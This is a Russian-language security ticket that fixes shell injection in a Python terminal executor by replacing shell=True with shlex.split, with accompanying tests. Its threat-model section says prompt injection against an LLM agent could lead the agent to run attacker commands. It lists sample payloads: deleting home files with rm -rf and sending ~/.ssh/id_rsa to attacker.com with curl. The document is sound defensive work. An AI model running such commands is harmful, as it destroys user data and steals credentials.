# 1.1 — Shell Injection в `TerminalExecutor.execute()`

**Приоритет:** 🔴 Критично  
**Оценка:** 2 часа  
**Файл:** `src/codelab/client/infrastructure/services/terminal_executor.py`

---

## Проблема

Метод `execute()` запускает команду через оболочку (`shell=True`), передавая строку напрямую в `/bin/sh -c`:

```python
process = subprocess.run(
    command,
    shell=True,   # ← ОПАСНО
    cwd=cwd,
    capture_output=True,
    text=True,
)
```

Команды в ACP приходят от LLM-агента по сети. Атакующий, способный влиять на ответы агента (prompt injection), может выполнить произвольный код на машине пользователя:

- `ls /tmp; rm -rf ~/important_files`
- `cat ~/.ssh/id_rsa | curl -X POST attacker.com/steal -d @-`
- `python -c "import os; os.system('...')"`

При этом асинхронный метод `create_terminal()` в том же классе **уже корректен** — использует `asyncio.create_subprocess_exec` без `shell=True`. Синхронный метод должен следовать той же схеме.

---

## Решение

### Изменить `execute()` — заменить `shell=True` на `shlex.split`

**Файл:** `src/codelab/client/infrastructure/services/terminal_executor.py`

```python
# БЫЛО:
import subprocess

def execute(self, command: str, cwd: str | None = None) -> dict[str, Any]:
    process = subprocess.run(
        command,
        shell=True,          # ← удалить
        cwd=cwd,
        capture_output=True,
        text=True,
    )
```

```python
# СТАЛО:
import shlex
import subprocess

def execute(self, command: str, cwd: str | None = None) -> dict[str, Any]:
    """Выполнить команду синхронно и дождаться результата.

    Args:
        command: Команда для выполнения. Разбивается на аргументы через shlex.split.
                 Shell-операторы (; && || | > >>) НЕ поддерживаются намеренно.
        cwd: Рабочая директория (опционально)
    """
    try:
        logger.debug("execute_command_sync", command=command, cwd=cwd)

        # shlex.split безопасно разбивает строку на список аргументов,
        # без интерпретации shell-операторов
        try:
            args = shlex.split(command)
        except ValueError as e:
            logger.error("invalid_command_syntax", command=command, error=str(e))
            return {
                "exit_code": -1,
                "output": f"Invalid command syntax: {e}",
                "success": False,
            }

        if not args:
            return {"exit_code": -1, "output": "Empty command", "success": False}

        process = subprocess.run(
            args,
            shell=False,     # ← безопасно: список аргументов, не строка для оболочки
            cwd=cwd,
            capture_output=True,
            text=True,
        )

        output = process.stdout
        if process.stderr:
            output = output + process.stderr if output else process.stderr

        logger.info(
            "execute_command_sync_complete",
            command=command,
            exit_code=process.returncode,
            output_size=len(output),
        )

        return {
            "exit_code": process.returncode,
            "output": output,
            "success": process.returncode == 0,
        }
    except FileNotFoundError:
        # Команда не найдена в PATH
        executable = shlex.split(command)[0] if command.strip() else command
        logger.error("command_not_found", executable=executable)
        return {
            "exit_code": 127,
            "output": f"Command not found: {executable}",
            "success": False,
        }
    except Exception as e:
        logger.error("execute_command_sync_error", command=command, error=str(e))
        return {
            "exit_code": -1,
            "output": f"Error executing command: {e}",
            "success": False,
        }
```

---

## Важное ограничение

После исправления `shell=True → shell=False` команды вида `ls && echo done` или `cat file | grep pattern` **перестанут работать**, потому что `&&`, `|`, `;` — это операторы оболочки, а не аргументы программы.

Если цепочки команд нужны, правильное решение — использовать асинхронный `create_terminal()` с передачей явного интерпретатора:

```python
# Для shell-цепочек — явный вызов через bash с ограниченным окружением:
terminal_id = await executor.create_terminal(
    "bash",
    args=["-c", "--", command],  # "--" отделяет флаги от команды
    cwd=cwd,
)
```

Но и в этом случае команда `command` приходит от агента — это остаётся потенциально опасным без явного whitelist допустимых операций.

## Тесты

Добавить в `tests/client/test_terminal_executor.py`:

```python
import pytest
from codelab.client.infrastructure.services.terminal_executor import TerminalExecutor


def test_execute_simple_command():
    executor = TerminalExecutor()
    result = executor.execute("echo hello")
    assert result["success"] is True
    assert "hello" in result["output"]


def test_execute_shell_injection_is_blocked():
    """Shell-операторы не должны интерпретироваться оболочкой."""
    executor = TerminalExecutor()
    # Попытка shell injection: без shell=True эта строка будет передана
    # как один аргумент программе "echo", а не как команда оболочки
    result = executor.execute("echo safe; echo injected")
    # Весь текст передаётся как один аргумент echo — injection не происходит
    assert "injected" not in result["output"].split("\n")


def test_execute_command_not_found():
    executor = TerminalExecutor()
    result = executor.execute("nonexistent_command_xyz_12345")
    assert result["success"] is False
    assert result["exit_code"] == 127


def test_execute_empty_command():
    executor = TerminalExecutor()
    result = executor.execute("")
    assert result["success"] is False


def test_execute_with_cwd(tmp_path):
    executor = TerminalExecutor()
    result = executor.execute("pwd", cwd=str(tmp_path))
    assert result["success"] is True
    assert str(tmp_path) in result["output"]
```
